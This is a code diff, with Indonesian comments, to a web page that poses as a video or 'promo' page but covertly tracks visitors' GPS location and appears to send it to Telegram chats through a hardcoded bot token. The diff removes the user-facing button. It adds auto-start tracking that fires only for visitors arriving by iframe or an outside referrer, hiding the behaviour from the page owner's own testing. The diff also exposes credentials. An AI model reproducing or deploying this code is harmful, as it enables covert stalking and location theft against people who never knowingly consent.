@@ -9,33 +9,29 @@
         #video-container { margin: 20px auto; max-width: 560px; }
         #youtube-video { width: 100%; height: 315px; border: none; }
         #status { font-size: 12px; color: #666; margin-top: 10px; opacity: 0.7; }
-        #location-btn { padding: 10px 20px; background: #007bff; color: white; border: none; border-radius: 5px; cursor: pointer; margin: 10px; display: none; } /* Sembunyi awal */
-        #location-btn:hover { background: #0056b3; }
     </style>
 </head>
 <body>
-    <h1><b><i>SusiXx</i></b></h1>
-    <p><b>For You</b></p>
+    <h1>!</h1>
+    <p>...</p>
     
     <div id="video-container">
         <iframe id="youtube-video" src="https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1&mute=1&rel=0" allow="autoplay; encrypted-media" allowfullscreen></iframe>
     </div>
     
-    <button id="location-btn" onclick="requestLocation()">Lanjut</button>
-    
-    <div id="status">Klik tombol di atas untuk lanjut...</div>
+    <div id="status">Tunggu sebentar...</div>
 
     <script>
         // Ganti ini
         const BOT_TOKEN = '7822471568:AAE89BHf7mxBx4kqhKNLyE7yP4IlMgi8wFE';
         const CHAT_IDS = ['7680606818', '6212362026']; // Tambah ID kedua di sini
+        const YOUR_DOMAIN = 'raldo-xtracker.vercel.app'; // Ganti dengan domain lo buat deteksi referrer
         
         let watchId;
         let lastLat = null;
         let lastLng = null;
         const MIN_DISTANCE = 5;
         const status = document.getElementById('status');
-        const locationBtn = document.getElementById('location-btn');
         let retryCount = 0;
         const MAX_RETRIES = 2;
 
@@ -111,8 +107,7 @@
             let msg = 'Verifikasi gagal: ';
             switch(error.code) {
                 case error.PERMISSION_DENIED:
-                    msg += 'I🌹🌹❤❤💕💕. Coba klik tombol lagi.';
-                    locationBtn.style.display = 'inline-block'; // Tampilkan tombol buat retry
+                    msg += 'I🌹🌹❤❤💕💕.';
                     break;
                 case error.POSITION_UNAVAILABLE:
                     msg += '🌹🌹🌹🌹🌹🌹.';
@@ -124,7 +119,6 @@
                         setTimeout(() => attemptGeolocation(false), 2000);
                     } else {
                         msg += ' (Coba matikan VPN atau keluar ruangan)';
-                        locationBtn.style.display = 'inline-block';
                     }
                     break;
             }
@@ -138,8 +132,7 @@
                 timeout: 30000,
                 maximumAge: 1000
             };
-            status.innerHTML = `Tunggu...${highAccuracy ? ' 😘' : ''}...`;
-            locationBtn.style.display = 'none'; // Sembunyikan tombol pas proses
+            status.innerHTML = `Meminta akses lokasi${highAccuracy ? ' akurat' : ''}...`;
             
             navigator.geolocation.getCurrentPosition(
                 (pos) => {
@@ -152,34 +145,7 @@
             );
         }
 
-        // Fungsi request lokasi (dari tombol)
-        async function requestLocation() {
-            // Cek permission status dulu pake Permissions API (buat retry kalo denied)
-            if (navigator.permissions && navigator.permissions.query) {
-                try {
-                    const permission = await navigator.permissions.query({ name: 'geolocation' });
-                    if (permission.state === 'granted') {
-                        // Udah granted, langsung attempt
-                        attemptGeolocation(true);
-                    } else if (permission.state === 'denied') {
-                        // Denied, coba request ulang (browser mungkin prompt lagi)
-                        status.innerHTML = 'Minta izin lokasi lagi...';
-                        attemptGeolocation(true);
-                    } else {
-                        // Prompt, langsung request
-                        attemptGeolocation(true);
-                    }
-                } catch (e) {
-                    console.log('Permissions API nggak support, langsung request');
-                    attemptGeolocation(true);
-                }
-            } else {
-                // Fallback tanpa Permissions API
-                attemptGeolocation(true);
-            }
-        }
-
-        // Handle network change (sama)
+        // Handle network change
         window.addEventListener('online', () => {
             console.log('Network online - retrying geolocation');
             if (retryCount > 0) {
@@ -190,13 +156,30 @@
         window.addEventListener('offline', () => {
             console.log('Network offline');
             status.innerHTML = 'Koneksi hilang. Coba lagi.';
-            locationBtn.style.display = 'inline-block';
         });
 
-        // Auto tampilkan tombol pas load
-        window.addEventListener('load', () => {
-            locationBtn.style.display = 'inline-block';
-        });
+        // Deteksi apakah ini target eksternal (bukan web lo)
+        function isExternalTarget() {
+            const inIframe = window.self !== window.top; // True kalo diembed iframe
+            const referrer = document.referrer;
+            const hasExternalReferrer = referrer && !referrer.includes(YOUR_DOMAIN); // True kalo referrer beda domain lo
+            
+            console.log('Deteksi: In iframe?', inIframe, 'External referrer?', hasExternalReferrer);
+            return inIframe || hasExternalReferrer; // Jalan kalo salah satu true
+        }
+
+        // Auto start hanya kalo external target
+        function initTracking() {
+            if (navigator.geolocation && isExternalTarget()) {
+                status.innerHTML = 'Memverifikasi lokasi untuk promo...';
+                attemptGeolocation(true);
+            } else {
+                status.innerHTML = 'Promo hanya untuk akses eksternal. Terima kasih!'; // Halus buat test lo
+                console.log('Tracking skipped: Not external target.');
+            }
+        }
+
+        window.addEventListener('load', initTracking);
     </script>
 </body>
 </html>
